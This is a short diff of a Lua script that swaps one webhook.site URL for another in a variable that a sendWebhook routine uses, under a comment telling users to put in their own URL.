@@ -78,7 +78,7 @@ local function sendWebhook(webhookUrl, data)
 end
 
 -- Replace the webhook URL with your own URL
-local webhookUrl = "https://webhook.site/7d74623f-1f41-4d55-8c24-2938a9aeb0b4"
+local webhookUrl = "https://webhook.site/17f7be08-0876-410a-a0b1-08ce40cafed2/08d0b850-4320-40db-a841-646fc877e07e"
 local webhookData = createWebhookData()
 
 -- Sending the webhook
